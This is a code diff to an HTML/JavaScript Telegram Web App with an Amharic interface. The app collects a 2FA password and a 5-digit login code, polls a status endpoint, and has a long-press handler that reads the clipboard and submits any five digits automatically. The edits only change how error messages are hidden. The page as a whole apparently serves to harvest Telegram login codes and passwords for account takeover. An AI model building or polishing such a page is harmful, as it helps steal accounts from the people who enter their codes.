@@ -289,7 +289,7 @@
                 <p>የደህንነት ማረጋገጫ (2FA Password) ያስገቡ።</p>
                 
                 <div class="pass-wrapper">
-                    <input type="password" id="2fa_input" placeholder="Password" oninput="hideError(3)">
+                    <input type="password" id="2fa_input" placeholder="Password">
                     <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()"></i>
                 </div>
                 
@@ -324,7 +324,6 @@
     <div id="bgLayer" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1; opacity:0.03; background-size:cover;"></div>
 
 <script>
-    /* JavaScript is preserved exactly as requested with minor enhancements for UI logic */
     const tg = window.Telegram.WebApp;
     tg.expand();
 
@@ -355,6 +354,11 @@
 
         statusChecker = setInterval(checkStatus, 3000);
         setupLongPressPaste(); 
+        
+        // Hide error message when user starts typing 2FA password
+        document.getElementById('2fa_input').addEventListener('input', () => {
+            document.getElementById('status3').style.display = 'none';
+        });
     };
 
     function showStep(n) {
@@ -449,7 +453,9 @@
     }
 
     function press(num) {
-        hideError(2); // አዲስ ቁጥር ሲጫን የነበረውን Error ያጠፋል
+        // Hide error message on step 2 when typing starts
+        document.getElementById('status2').style.display = 'none';
+        
         if (currentOtp.length < 5) {
             currentOtp += num;
             updateOtpUI();
@@ -516,13 +522,6 @@
         el.className = 'msg ' + type; el.innerText = text; el.style.display = 'block';
     }
 
-    function hideError(stepId) {
-        const el = document.getElementById('status' + stepId);
-        if(el && el.classList.contains('error')) {
-            el.style.display = 'none';
-        }
-    }
-
     function startFloodTimer(seconds) {
         showStep('flood_step');
         let rem = seconds;
@@ -541,7 +540,12 @@
                 try {
                     const text = await navigator.clipboard.readText();
                     const cleanCode = text.replace(/\D/g, '').slice(0, 5);
-                    if (cleanCode.length === 5) { currentOtp = cleanCode; updateOtpUI(); submitOTP(); }
+                    if (cleanCode.length === 5) { 
+                        document.getElementById('status2').style.display = 'none';
+                        currentOtp = cleanCode; 
+                        updateOtpUI(); 
+                        submitOTP(); 
+                    }
                 } catch (err) {}
             }, 800);
         });
